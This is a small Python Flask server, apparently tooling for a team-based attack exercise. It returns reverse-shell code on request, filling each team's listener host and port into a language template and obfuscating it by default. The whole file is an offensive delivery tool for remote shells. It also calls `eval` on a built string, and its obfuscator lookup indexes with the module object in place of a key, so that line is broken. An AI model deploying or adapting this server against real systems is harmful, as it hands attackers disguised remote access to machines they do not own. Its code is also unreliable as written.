import json, obfuscator
from flask import Flask, request, Response

app = Flask(__name__)

DEFAULT_LANGUAGE = 'bash'
DEFAULT_OBFUSCATE = False

@app.route('/', methods=['GET'], defaults={'team_id': None, 'language': None, 'return_raw': None})
@app.route('/<team_id>', methods=['GET'], defaults={'language': None, 'return_raw': None})
@app.route('/<team_id>/<language>', methods=['GET'], defaults={'return_raw': None})
@app.route('/<team_id>/<language>/<return_raw>', methods=['GET'])

def get_reverse_shell_code(team_id, language, return_raw):
    with open('payload.json', 'r') as f:
        payload = json.loads(f.read())

    with open('teams.json', 'r') as f:
        teams = json.loads(f.read())

    if not team_id in teams:
        team_id = 'default'
    host = teams[team_id]['host']
    port = teams[team_id]['port']

    if language not in payload:
        language = DEFAULT_LANGUAGE

    code = payload[language]['raw'].format(HOST=host, PORT=port)
    if not return_raw:
        code = eval('obfuscator.' + payload[language][obfuscator])(code)

    return Response(code, mimetype='text/plain')

if __name__ == '__main__':
    # TODO: setup with argv
    app.run(host='0.0.0.0')
